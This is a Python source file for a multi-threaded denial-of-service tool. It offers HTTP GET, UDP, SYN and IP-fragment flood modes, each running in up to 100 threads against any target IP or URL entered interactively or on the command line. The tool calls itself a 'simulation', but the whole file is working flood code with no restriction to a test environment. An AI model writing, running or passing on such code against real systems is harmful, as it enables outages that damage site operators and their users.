import threading
import socket
import random
import time
import argparse
import requests
from scapy.all import IP, TCP, send
import signal
import sys
from colorama import Fore, Style, init

init(autoreset=True)

stop_event = threading.Event()

def http_flood(target_url):
    while not stop_event.is_set():
        try:
            requests.get(target_url, timeout=2)
            print(Fore.GREEN + f"[HTTP] Sent GET to {target_url}")
        except:
            print(Fore.RED + "[HTTP] Failed.")

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    while not stop_event.is_set():
        try:
            sock.sendto(bytes_data, (target_ip, target_port))
            print(Fore.GREEN + f"[UDP] Sent packet to {target_ip}:{target_port}")
        except:
            print(Fore.RED + "[UDP] Send failed.")

def syn_flood(target_ip, target_port):
    try:
        while not stop_event.is_set():
            ip = IP(dst=target_ip)
            tcp = TCP(dport=target_port, flags="S")
            pkt = ip / tcp
            send(pkt, verbose=0)
            print(Fore.GREEN + f"[SYN] Sent SYN to {target_ip}:{target_port}")
    except:
        print(Fore.RED + "[SYN] Error sending packet (need root?)")

def ip_fragment_flood(target_ip):
    try:
        while not stop_event.is_set():
            ip = IP(dst=target_ip, flags="MF", frag=0) / ("X" * 1480)
            send(ip, verbose=0)
            print(Fore.GREEN + f"[IP-FRAG] Sent fragmented packet to {target_ip}")
    except:
        print(Fore.RED + "[IP-FRAG] Error sending packet (need root?)")

def signal_handler(sig, frame):
    print(Fore.YELLOW + "\n[!] Attack interrupted. Stopping threads...")
    stop_event.set()
    sys.exit(0)

def interactive_mode():
    print(Fore.CYAN + "[*] Interactive Mode")
    mode = input("Enter attack mode (http, udp, syn, ipfrag): ").strip().lower()
    ip = input("Enter target IP (leave blank if using HTTP mode): ").strip()
    port = input("Enter target port (default 80): ").strip()
    url = input("Enter target URL (only for HTTP mode): ").strip()
    threads = input("Number of threads (default 100): ").strip()

    return {
        'mode': mode,
        'ip': ip if ip else None,
        'port': int(port) if port else 80,
        'url': url if url else None,
        'threads': int(threads) if threads else 100
    }

def launch_attack(mode, ip, port, url, threads=100):
    print(Fore.CYAN + f"[*] Starting {mode.upper()} attack with {threads} threads...")

    if mode == "http" and not url:
        print(Fore.RED + "[!] --url is required for HTTP flood.")
        return
    if mode in ["udp", "syn", "ipfrag"] and not ip:
        print(Fore.RED + f"[!] --ip is required for {mode.upper()} flood.")
        return

    for _ in range(threads):
        if mode == "http":
            t = threading.Thread(target=http_flood, args=(url,))
        elif mode == "udp":
            t = threading.Thread(target=udp_flood, args=(ip, port))
        elif mode == "syn":
            t = threading.Thread(target=syn_flood, args=(ip, port))
        elif mode == "ipfrag":
            t = threading.Thread(target=ip_fragment_flood, args=(ip,))
        else:
            print(Fore.RED + "[!] Unknown attack mode.")
            return
        t.daemon = True
        t.start()

    print(Fore.YELLOW + "[*] Press Ctrl+C to stop the attack.")
    signal.signal(signal.SIGINT, signal_handler)

    # Fallback loop instead of signal.pause (for Windows compatibility)
    try:
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        args = interactive_mode()
    else:
        parser = argparse.ArgumentParser(description="Multi-threaded DDoS simulation tool")
        parser.add_argument("--mode", required=True, help="Attack type: http | udp | syn | ipfrag")
        parser.add_argument("--ip", help="Target IP address")
        parser.add_argument("--port", type=int, default=80, help="Target port")
        parser.add_argument("--url", help="Target URL (for HTTP flood)")
        parser.add_argument("--threads", type=int, default=100, help="Number of threads")
        cli_args = parser.parse_args()

        args = {
            'mode': cli_args.mode,
            'ip': cli_args.ip,
            'port': cli_args.port,
            'url': cli_args.url,
            'threads': cli_args.threads
        }

    launch_attack(args['mode'], args['ip'], args['port'], args['url'], args['threads'])